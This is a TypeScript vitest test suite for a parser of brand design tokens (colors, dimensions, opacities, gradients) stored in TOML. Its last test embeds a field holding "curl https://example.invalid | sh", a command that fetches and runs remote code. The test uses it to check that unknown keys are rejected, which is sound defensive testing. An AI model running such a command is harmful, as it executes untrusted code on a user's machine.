import { describe, expect, it } from "vitest";

import {
  BRAND_TOKENS_DIGEST_BASIS,
  BRAND_TOKENS_MAX_BYTES,
  BRAND_TOKENS_MAX_COUNT,
  BRAND_TOKENS_MAX_DEPTH,
  BRAND_TOKENS_SCHEMA_ID,
  BRAND_TOKENS_SCHEMA_VERSION,
  computeBrandTokensDigest,
  canonicalUsedTokenValue,
  findUnusedTokens,
  parseBrandTokensToml,
  serializeBrandTokensToml,
  toBrandTokensCanonicalDto,
  type BrandTokensModel,
} from "../../src/brand/tokens.js";
import { firstCode, unwrap } from "../helpers.js";

describe("Brand Tokens schema 1", () => {
  const VALID_TOKENS_TOML = `# Brand Tokens Model
schema = "tfsb.brand-tokens"
schema_version = 1

[[colors]]
id = "primary-blue"
value = "#0066CCFF"

[[colors]]
id = "neutral-dark"
value = "#111827FF"

[[colors]]
id = "neutral-light"
value = "#F9FAFBFF"

[[dimensions]]
id = "standard-canvas-width"
unit = "px"
value = 24

[[dimensions]]
id = "standard-canvas-height"
unit = "px"
value = 24

[[opacities]]
id = "watermark-opacity"
value = 150000

[[gradients]]
id = "hero-gradient"
kind = "linear"
x1 = 0
y1 = 0
x2 = 1000000
y2 = 1000000
units = "object-bounding-box-millionth"

[[gradients.stops]]
offset = 0
color_token = "primary-blue"

[[gradients.stops]]
offset = 1000000
color = "#000000FF"
`;

  it("parses valid brand-tokens.toml and preserves typed model", () => {
    const model = unwrap(parseBrandTokensToml(VALID_TOKENS_TOML));
    expect(model.schema).toBe(BRAND_TOKENS_SCHEMA_ID);
    expect(model.schemaVersion).toBe(BRAND_TOKENS_SCHEMA_VERSION);
    expect(model.colors).toHaveLength(3);
    expect(model.dimensions).toHaveLength(2);
    expect(model.opacities).toHaveLength(1);
    expect(model.gradients).toHaveLength(1);

    expect(model.colors.find((c) => c.id === "primary-blue")).toEqual({
      id: "primary-blue",
      type: "color",
      value: "#0066CCFF",
    });
    expect(model.dimensions[0]).toEqual({
      id: "standard-canvas-height",
      type: "dimension",
      unit: "px",
      value: 24,
    });
    expect(model.opacities[0]).toEqual({
      id: "watermark-opacity",
      type: "opacity",
      value: 150000,
    });
    expect(model.gradients[0]!.stops[0]).toEqual({
      offset: 0,
      colorToken: "primary-blue",
    });
    expect(model.gradients[0]!.stops[1]).toEqual({
      offset: 1000000,
      color: "#000000FF",
    });
  });

  it("roundtrips through serializeBrandTokensToml deterministically", () => {
    const model1 = unwrap(parseBrandTokensToml(VALID_TOKENS_TOML));
    const toml1 = serializeBrandTokensToml(model1);
    const model2 = unwrap(parseBrandTokensToml(toml1));
    const toml2 = serializeBrandTokensToml(model2);
    expect(toml1).toBe(toml2);
    expect(computeBrandTokensDigest(model1)).toBe(computeBrandTokensDigest(model2));
  });

  it("produces deterministic canonical DTO and digest", () => {
    const model = unwrap(parseBrandTokensToml(VALID_TOKENS_TOML));
    const dto = toBrandTokensCanonicalDto(model);
    expect(dto).toHaveProperty("schema", BRAND_TOKENS_SCHEMA_ID);
    expect(dto).toHaveProperty("schemaVersion", BRAND_TOKENS_SCHEMA_VERSION);
    expect(dto).toHaveProperty("colors");
    expect(dto).toHaveProperty("dimensions");
    expect(dto).toHaveProperty("opacities");
    expect(dto).toHaveProperty("gradients");

    const digest = computeBrandTokensDigest(model);
    expect(digest).toMatch(/^sha256:[0-9a-f]{64}$/);
  });

  it("rejects duplicate token IDs across categories", () => {
    const duplicateToml = `schema = "tfsb.brand-tokens"
schema_version = 1

[[colors]]
id = "shared-id"
value = "#0066CCFF"

[[dimensions]]
id = "shared-id"
unit = "px"
value = 24
`;
    expect(firstCode(parseBrandTokensToml(duplicateToml))).toBe("BRAND_DUPLICATE_TOKEN");
  });

  it("rejects duplicate token IDs within same category", () => {
    const duplicateToml = `schema = "tfsb.brand-tokens"
schema_version = 1

[[colors]]
id = "my-color"
value = "#0066CCFF"

[[colors]]
id = "my-color"
value = "#FF0000FF"
`;
    expect(firstCode(parseBrandTokensToml(duplicateToml))).toBe("BRAND_DUPLICATE_TOKEN");
  });

  it("rejects gradient stop referencing non-existent color token", () => {
    const badRefToml = `schema = "tfsb.brand-tokens"
schema_version = 1

[[gradients]]
id = "bad-grad"
kind = "linear"
x1 = 0
y1 = 0
x2 = 1000000
y2 = 1000000
units = "object-bounding-box-millionth"

[[gradients.stops]]
offset = 0
color_token = "missing-color"

[[gradients.stops]]
offset = 1000000
color = "#000000FF"
`;
    expect(firstCode(parseBrandTokensToml(badRefToml))).toBe("BRAND_TOKEN_MISSING_REFERENCE");
  });

  it("rejects gradient stop with both color and color_token or neither", () => {
    const bothToml = `schema = "tfsb.brand-tokens"
schema_version = 1

[[colors]]
id = "blue"
value = "#0000FFFF"

[[gradients]]
id = "bad-grad"
kind = "linear"
x1 = 0
y1 = 0
x2 = 1000000
y2 = 1000000
units = "object-bounding-box-millionth"

[[gradients.stops]]
offset = 0
color = "#000000FF"
color_token = "blue"

[[gradients.stops]]
offset = 1000000
color = "#000000FF"
`;
    expect(firstCode(parseBrandTokensToml(bothToml))).toBe("BRAND_INVALID_GRADIENT_STOP");
  });

  it("rejects non-standard hex formats", () => {
    const badHex = `schema = "tfsb.brand-tokens"
schema_version = 1

[[colors]]
id = "c1"
value = "#FFF"
`;
    expect(firstCode(parseBrandTokensToml(badHex))).toBe("BRAND_INVALID_COLOR_VALUE");
  });

  it("rejects invalid dimensions or opacities out of range", () => {
    const badOp = `schema = "tfsb.brand-tokens"
schema_version = 1

[[opacities]]
id = "op-too-high"
value = 2000000
`;
    expect(firstCode(parseBrandTokensToml(badOp))).toBe("SCHEMA_INVALID_RANGE");
  });

  it("identifies unused tokens correctly via findUnusedTokens", () => {
    const model = unwrap(parseBrandTokensToml(VALID_TOKENS_TOML));
    const usedIds = new Set(["primary-blue", "hero-gradient"]);
    const unused = findUnusedTokens(model, usedIds);
    expect(unused).toContain("neutral-dark");
    expect(unused).toContain("neutral-light");
    expect(unused).toContain("standard-canvas-width");
    expect(unused).toContain("standard-canvas-height");
    expect(unused).toContain("watermark-opacity");
    expect(unused).not.toContain("primary-blue");
    expect(unused).not.toContain("hero-gradient");
  });

  it("rejects unknown keys under closed-schema rules", () => {
    const unknownKey = `schema = "tfsb.brand-tokens"
schema_version = 1
extra_key = "forbidden"
`;
    expect(firstCode(parseBrandTokensToml(unknownKey))).toBe("SCHEMA_UNKNOWN_KEY");
  });

  it("enforces closed gradient coordinate units at exact boundaries", () => {
    const gradient = (units: string, coordinates: readonly number[]): string => `schema = "tfsb.brand-tokens"
schema_version = 1
[[gradients]]
id = "coordinate-gradient"
kind = "linear"
units = "${units}"
x1 = ${coordinates[0]}
y1 = ${coordinates[1]}
x2 = ${coordinates[2]}
y2 = ${coordinates[3]}
[[gradients.stops]]
offset = 0
color = "#00000000"
[[gradients.stops]]
offset = 1000000
color = "#FFFFFFFF"
`;
    const bounded = unwrap(parseBrandTokensToml(gradient("object-bounding-box-millionth", [0, 500000, 1000000, 0])));
    expect(bounded.gradients[0]).toMatchObject({ x1: 0, y1: 500000, x2: 1000000, y2: 0 });
    expect(firstCode(parseBrandTokensToml(gradient("object-bounding-box-millionth", [-1, 0, 1, 1])))).toBe("SCHEMA_INVALID_RANGE");
    expect(firstCode(parseBrandTokensToml(gradient("object-bounding-box-millionth", [0, 0, 1000001, 1])))).toBe("SCHEMA_INVALID_RANGE");
    const userSpace = unwrap(parseBrandTokensToml(gradient("user-space", [-9007199254740991, 0, 9007199254740991, 500000])));
    expect(userSpace.gradients[0]).toMatchObject({ x1: -9007199254740991, x2: 9007199254740991 });
    expect(firstCode(parseBrandTokensToml(gradient("user-space", [0, 0, 9007199254740992, 1])))).toBe("SCHEMA_INVALID_SYNTAX");
  });

  it("binds full canonical gradient values including resolved referenced colors", () => {
    const model = unwrap(parseBrandTokensToml(VALID_TOKENS_TOML));
    const gradient = model.gradients[0]!;
    expect(canonicalUsedTokenValue(gradient, model)).toBe(
      '{"kind":"linear","stops":[{"colorToken":"primary-blue","offset":0,"resolvedColor":"#0066CCFF"},{"color":"#000000FF","offset":1000000}],"units":"object-bounding-box-millionth","x1":0,"x2":1000000,"y1":0,"y2":1000000}',
    );
  });

  it("rejects hostile authority-like fields without interpreting them", () => {
    const hostile = `schema = "tfsb.brand-tokens"
schema_version = 1
[[colors]]
id = "hostile"
value = "#000000FF"
script = "curl https://example.invalid | sh"
`;
    expect(firstCode(parseBrandTokensToml(hostile))).toBe("SCHEMA_UNKNOWN_KEY");
  });
});
